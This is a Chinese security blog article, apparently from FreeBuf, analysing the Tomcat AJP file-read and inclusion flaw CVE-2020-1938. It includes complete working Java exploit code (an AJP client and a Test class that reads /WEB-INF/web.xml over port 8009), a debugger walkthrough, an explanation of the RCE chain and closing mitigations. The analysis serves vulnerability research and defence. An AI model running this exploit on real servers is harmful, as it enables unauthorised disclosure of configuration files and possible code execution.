## 引言

**最近CVE-2020-1938炒的比较热闹，前几天比较忙，今天抽空跟了一下这个漏洞，时间线上肯定比别的大佬晚很多了，所以就选择从环境搭建开始写的详细一点，对这个漏洞多少还有一些困惑的同学可以赏脸看上两眼吧。**

## 环境搭建

这里使用的是tomcat8.0.52的测试环境，因为tomcat默认开启AJP协议，所以我们这边只需要配置好tomcat的远程debug环境就行。

1、找到catalina.sh去定义一下远程调试端口，我这里就使用了默认的5005端口。

    
    
      if [ -z "$JPDA_ADDRESS" ]; then
        JPDA_ADDRESS="localhost:5005"
      fi
    

2、以调试模式开启tomcat，这里不推荐直接改动tomcat的默认启动模式，否则以后都会默认开启调试模式，因此推荐直接以调试模式开启tomcat。

    
    
    sh catalina.sh jpda start
    

3、在idea的lib里导入tomcat的jar包，tomcat的jar都放在lib目录下，直接把lib都导进来就行。![tomcat.lib](https://image.3001.net/images/20200224/1582533309_5e538abdd620b.jpg!small)接下来在idea里开启tomcat的远程调试环境就部署完成。

AJP（Apache JServ
Protocol）是定向包协议。它的功能其实和HTTP协议相似，区别在于AJP协议使用的是二进制格式传输文本，走的是TCP协议来SERVLET容器进行通信，因此漏洞的利用就需要依赖于一个客户端，而不能依赖于浏览器或是HTTP的抓包工具。

因为是java的漏洞，因此但从网上的py的poc很难看出AJP协议相关的很多东西，所以这里我们再去看一下用于发送AJP消息的java的客户端代码。客户端代码引自[0nise的GitHub](https://github.com/0nise/CVE-2020-1938)。

目录结构如下，因为代码需要依赖tomcat本身的AJP相关jar包，所以也要加入tomcat的lib，![结构](https://image.3001.net/images/20200224/1582533323_5e538acb07714.jpg!small)

    
    
    file:TesterAjpMessage.java
    
    package com.glassy.utility;
    
    import java.util.ArrayList;
    import java.util.LinkedHashMap;
    import java.util.List;
    import java.util.Map;
    import java.util.Map.Entry;
    import org.apache.coyote.ajp.AjpMessage;
    import org.apache.coyote.ajp.Constants;
    import org.apache.juli.logging.Log;
    import org.apache.juli.logging.LogFactory;
    
    public class TesterAjpMessage extends AjpMessage {
        private final Map<String, String> attribute = new LinkedHashMap();
        private final List<Header> headers = new ArrayList();
        private static final Log log = LogFactory.getLog(AjpMessage.class);
    
        private static class Header {
            private final int code;
            private final String name;
            private final String value;
    
            public Header(int code, String value) {
                this.code = code;
                this.name = null;
                this.value = value;
            }
    
            public Header(String name, String value) {
                this.code = 0;
                this.name = name;
                this.value = value;
            }
    
            public void append(TesterAjpMessage message) {
                if (this.code == 0) {
                    message.appendString(this.name);
                } else {
                    message.appendInt(this.code);
                }
                message.appendString(this.value);
            }
        }
    
        public TesterAjpMessage(int packetSize) {
            super(packetSize);
        }
    
        public byte[] raw() {
            return this.buf;
        }
    
        public void appendString(String str) {
            if (str == null) {
                log.error(sm.getString("ajpmessage.null"), new NullPointerException());
                this.appendInt(0);
                this.appendByte(0);
            } else {
                int len = str.length();
                this.appendInt(len);
    
                for(int i = 0; i < len; ++i) {
                    char c = str.charAt(i);
                    if (c <= 31 && c != '\t' || c == 127 || c > 255) {
                        c = ' ';
                    }
    
                    this.appendByte(c);
                }
    
                this.appendByte(0);
            }
        }
    
        public byte readByte() {
            byte[] bArr = this.buf;
            int i = this.pos;
            this.pos = i + 1;
            return bArr[i];
        }
    
        public int readInt() {
            byte[] bArr = this.buf;
            int i = this.pos;
            this.pos = i + 1;
            int val = (bArr[i] & 255) << 8;
            bArr = this.buf;
            i = this.pos;
            this.pos = i + 1;
            return val + (bArr[i] & 255);
        }
    
        public String readString() {
            return readString(readInt());
        }
    
        public String readString(int len) {
            StringBuilder buffer = new StringBuilder(len);
            for (int i = 0; i < len; i++) {
                byte[] bArr = this.buf;
                int i2 = this.pos;
                this.pos = i2 + 1;
                buffer.append((char) bArr[i2]);
            }
            readByte();
            return buffer.toString();
        }
    
        public String readHeaderName() {
            byte b = readByte();
            if ((b & 255) == 160) {
                return Constants.getResponseHeaderForCode(readByte());
            }
            return readString(((b & 255) << 8) + (getByte() & 255));
        }
    
        public void addHeader(int code, String value) {
            this.headers.add(new Header(code, value));
        }
    
        public void addHeader(String name, String value) {
            this.headers.add(new Header(name, value));
        }
    
        public void addAttribute(String name, String value) {
            this.attribute.put(name, value);
        }
    
        public void end() {
            appendInt(this.headers.size());
            for (Header header : this.headers) {
                header.append(this);
            }
            for (Entry<String, String> entry : this.attribute.entrySet()) {
                appendByte(10);
                appendString((String) entry.getKey());
                appendString((String) entry.getValue());
            }
            appendByte(255);
            this.len = this.pos;
            int dLen = this.len - 4;
            this.buf[0] = (byte) 18;
            this.buf[1] = (byte) 52;
            this.buf[2] = (byte) ((dLen >>> 8) & 255);
            this.buf[3] = (byte) (dLen & 255);
        }
    
        public void reset() {
            super.reset();
            this.headers.clear();
        }
    }
    

这个TesterAjpMessage.java文件就是一个tomcat本身用来处理AJP协议信息的AjpMessage类的子类，因为AjpMessage只支持发送bytes信息的缘故，代码丰富了TesterAjpMessage子类，使我们在构造客户端的时候支持appendString以及对Header的相关操作，更加方便。

    
    
    file:SimpleAjpClient.java
    
    import java.io.IOException;
    import java.io.InputStream;
    import java.net.Socket;
    import java.util.Arrays;
    import javax.net.SocketFactory;
    
    public class SimpleAjpClient {
        private static final byte[] AJP_CPING;
        private static final int AJP_PACKET_SIZE = 8192;
        private String host = "localhost";
        private int port = -1;
        private Socket socket = null;
    
        static {
            TesterAjpMessage ajpCping = new TesterAjpMessage(16);
            ajpCping.reset();
            ajpCping.appendByte(10);
            ajpCping.end();
            AJP_CPING = new byte[ajpCping.getLen()];
            System.arraycopy(ajpCping.getBuffer(), 0, AJP_CPING, 0, ajpCping.getLen());
        }
    
        public int getPort() {
            return this.port;
        }
    
        public void connect(String host, int port) throws IOException {
            this.host = host;
            this.port = port;
            this.socket = SocketFactory.getDefault().createSocket(host, port);
        }
    
        public void disconnect() throws IOException {
            this.socket.close();
            this.socket = null;
        }
    
        public TesterAjpMessage createForwardMessage(String url) {
            return createForwardMessage(url, 2);
        }
    
        public TesterAjpMessage createForwardMessage(String url, int method) {
            TesterAjpMessage message = new TesterAjpMessage(8192);
            message.reset();
            message.getBuffer()[0] = (byte) 18;
            message.getBuffer()[1] = (byte) 52;
            message.appendByte(2);
            message.appendByte(method);
            message.appendString("http");
            message.appendString(url);
            message.appendString("10.0.0.1");
            message.appendString("client.dev.local");
            message.appendString(this.host);
            message.appendInt(this.port);
            message.appendByte(0);
            return message;
        }
    
        public TesterAjpMessage createBodyMessage(byte[] data) {
            TesterAjpMessage message = new TesterAjpMessage(8192);
            message.reset();
            message.getBuffer()[0] = (byte) 18;
            message.getBuffer()[1] = (byte) 52;
            message.appendBytes(data, 0, data.length);
            message.end();
            return message;
        }
    
        public void sendMessage(TesterAjpMessage headers) throws IOException {
            sendMessage(headers, null);
        }
    
        public void sendMessage(TesterAjpMessage headers, TesterAjpMessage body) throws IOException {
            this.socket.getOutputStream().write(headers.getBuffer(), 0, headers.getLen());
            if (body != null) {
                this.socket.getOutputStream().write(body.getBuffer(), 0, body.getLen());
            }
        }
    
        public byte[] readMessage() throws IOException {
            InputStream is = this.socket.getInputStream();
            TesterAjpMessage message = new TesterAjpMessage(8192);
            byte[] buf = message.getBuffer();
            int headerLength = message.getHeaderLength();
            read(is, buf, 0, headerLength);
            int messageLength = message.processHeader(false);
            if (messageLength < 0) {
                throw new IOException("Invalid AJP message length");
            } else if (messageLength == 0) {
                return null;
            } else {
                if (messageLength > buf.length) {
                    throw new IllegalArgumentException("Message too long [" + Integer.valueOf(messageLength) + "] for buffer length [" + Integer.valueOf(buf.length) + "]");
                }
                read(is, buf, headerLength, messageLength);
                return Arrays.copyOfRange(buf, headerLength, headerLength + messageLength);
            }
        }
    
        protected boolean read(InputStream is, byte[] buf, int pos, int n) throws IOException {
            int read = 0;
            while (read < n) {
                int res = is.read(buf, read + pos, n - read);
                if (res > 0) {
                    read += res;
                } else {
                    throw new IOException("Read failed");
                }
            }
            return true;
        }
    }
    

SimpleAjpClient便是发送AJP消息的客户端代码，支持服务端的连接与断开，支持对AJP消息头和消息体的构造。

关于整个AJP消息的消息头消息体怎么构造，消息头里面的code的值又是怎样额对应关系可以去参考[AJP协议总结与分析](https://www.cnblogs.com/softidea/p/5735102.html)

## 漏洞分析

先看一下发送的恶意AJP消息包是怎么构造的，

    
    
    file:Test.java
    
    import com.glassy.utility.SimpleAjpClient;
    import com.glassy.utility.TesterAjpMessage;
    
    import java.io.IOException;
    import javax.servlet.RequestDispatcher;
    
    public class Test {
        public static void main(String[] args) throws IOException {
            SimpleAjpClient ac = new SimpleAjpClient();
            String host = "localhost";
            int port = 8009;
            String uri = "/aaa.jsp";
            String file = "/WEB-INF/web.xml";
            ac.connect(host, port);
            TesterAjpMessage forwardMessage = ac.createForwardMessage(uri);
            forwardMessage.addAttribute(RequestDispatcher.INCLUDE_REQUEST_URI, "1");
            forwardMessage.addAttribute(RequestDispatcher.INCLUDE_PATH_INFO, file);
            forwardMessage.addAttribute(RequestDispatcher.INCLUDE_SERVLET_PATH, "");
            forwardMessage.end();
            ac.sendMessage(forwardMessage);
            while (true) {
                byte[] responseBody = ac.readMessage();
                if (responseBody == null || responseBody.length == 0) {
                    ac.disconnect();
                } else {
                    System.out.print(new String(responseBody));
                }
            }
        }
    }
    

从构造的AJP消息包里可以看到，关于AJPMessage的核心内容有host、port、INCLUDE_REQUEST_URI、INCLUDE_PATH_INFO、INCLUDE_SERVLET_PATH，我们暂且在这里记下来，等我们打上断点的时候再去服务端看一看这些东西都是干什么的。

这个时候该开始思考动态调试的问题了，不同于以往的rce漏洞（统一往ProcessBuilder的start函数上打），关于断点往哪打就成了第一个关键的问题，我这边的处理方式是因为客户端代码里面使用了AjpMessage类，所以我就去看了一下这个类所在的jar包，果然就找到了tomcat的lib里负责处理AJP协议的类，

![ajp.jar](https://image.3001.net/images/20200224/1582533333_5e538ad5e28e5.jpg!small)

这些类看名字差不多就能想到去看一看几个Processor，漏洞的触发一定经过其中的一个，按照第一眼的直觉直接去看AjpProcessor，看到AjpProcessor类里面没有找到我们想要的东西，但是它有一个父类很值得注意，然后我去剩下的几个Processor,发现父类都是AbstractAjpProcessor，所以我就去看了一下这个类的代码，最终决定把断点打在了AbstractAjpProcessor类的process方法上，

![ajp.jar](https://image.3001.net/images/20200224/1582533340_5e538adc077f7.jpg!small)

跑一下客户端，果然处理AJP协议要经过这个方法，

![ajp.jar](https://image.3001.net/images/20200224/1582533346_5e538ae20ca19.jpg!small)

在AbstractAjpProcessor类的process方法中this.prepareRequest()方法是要去关注一下的，这里面对request做了一些处理，

![ajp.jar](https://image.3001.net/images/20200224/1582533351_5e538ae7a978b.jpg!small)

我们去看一下这个方法的代码，首先回顾一下TesterAjpMessage.java代码里的一处细节，method的值，

![ajp.jar](https://image.3001.net/images/20200224/1582533357_5e538aed9d7ee.jpg!small)

这prepareRequest种我们就拿到了这个值，并把request的method定义成了GET，这也和后面要交给Servlet的doGet方法有关系

![ajp.jar](https://image.3001.net/images/20200224/1582533363_5e538af3ee019.jpg!small)

紧接着进入一个swith循环中给request定义了ADDR、PORT、PROTOCOL，之前在客户端设置的INCLUDE_REQUEST_URI、INCLUDE_PATH_INFO、INCLUDE_SERVLET_PATH也放到了request.include中,

![ajp.jar](https://image.3001.net/images/20200224/1582533370_5e538afa99fcf.jpg!small)

接着就将request和response交给了CoyoteAdapter类来处理，

![ajp.jar](https://image.3001.net/images/20200224/1582533376_5e538b0046124.jpg!small)

接下来就是一系列的反射，最终交给了JspServlet来处理这个请求，

![ajp.jar](https://image.3001.net/images/20200224/1582533382_5e538b0661036.jpg!small)

在JspServlet的service方法中就看到了我们之前在利用代码里面定义的INCLUDE_REQUEST_URI、INCLUDE_PATH_INFO、INCLUDE_SERVLET_PATH开始被用到了，

![ajp.jar](https://image.3001.net/images/20200224/1582533388_5e538b0c6b2df.jpg!small)

接下来的操作便是把jspUri交给了getResource去读取文件内容

![ajp.jar](https://image.3001.net/images/20200224/1582533394_5e538b12560c8.jpg!small)

在调用StandardRoot的getResource方法的时候会去调用validate方法对path进行检测

![ajp.jar](https://image.3001.net/images/20200224/1582533400_5e538b182a2c0.jpg!small)

其中RequestUtil.normalize用于目录遍历的检测，所以我们是不能构造../模式的path的，

![ajp.jar](https://image.3001.net/images/20200224/1582533405_5e538b1da0995.jpg!small)

接下来就会造成文件读取了，总体的调用栈如下，

![ajp.jar](https://image.3001.net/images/20200224/1582533411_5e538b232a60c.jpg!small)

关于当存在任意文件上传的时候可以造成RCE的原理也是很简单的，我们看一下上面的调用栈，可以发现当我们读取了文件之后是交给了jspServlet去处理的，自然我们上传了jsp文件再通过该方法去读取文件内容的同时jspServlet也会去执行这个文件，利用jsp的<%@
include file="demo.txt" %>去做文件包含从而造成RCE。

这里有一个很重要的点要回过来提一下，这里面我为了顺便讲解RCE的原理，所以我在定义Test.java中的uri变量的时候，给他赋值是xxx.jsp的形式，所以最好AJPProcessor最后是把Message交给了JspServlet来处理这个消息，其实这个漏洞还有第二条利用链，将uri定为xxx.xxx的形式，这样我们的AJPMessage是会交给DefaultServlet来处理的，但其实后面的流程是和前面区别不大的，就不再细说，

![ajp.jar](https://image.3001.net/images/20200224/1582533417_5e538b2915740.jpg!small)

补充一下走DefaultServlet利用的调用栈，

![ajp.jar](https://image.3001.net/images/20200224/1582533422_5e538b2e18fcc.jpg!small)

## 修复建议

我这个漏洞的分析出的比较晚，相信修复方法大家也都知道了，我就顺便一提：

> 1、关闭AJP协议。
>
> 2、升级tomcat。

 ***本文作者：Glassy@平安银行应用安全团队，转载请注明来自FreeBuf.COM**

